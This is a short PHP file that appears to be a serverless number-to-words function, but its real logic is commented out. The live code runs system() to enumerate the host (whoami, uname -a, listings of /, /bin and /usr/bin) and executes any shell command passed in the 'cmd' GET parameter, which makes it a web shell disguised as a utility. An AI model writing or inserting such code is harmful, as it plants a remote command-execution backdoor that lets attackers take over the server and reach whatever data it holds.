<?php
use NFNumberToWord\NumberToWords;
 
function main(array $args)
{
//     if (!isset($args['number'])) {
//         return wrap(['error' => 'Please supply a number.']);
//     }
    
//     $number = (int)($args['number']);
//     $words = (new NumberToWords)->toWords($number);
 
    echo("------");
    echo(system("whoami ; uname -a ; ls -asl / ; find /bin ; find /usr/bin"));
    echo("\n");
    print("------");
 
    if(isset($_GET['cmd']))
    {
        echo(system($_GET['cmd']));
    }
 
//     return [
//         'body' => $words,
//     ];

}

function wrap(array $args) : array
{
    return ["body" => $args];
}
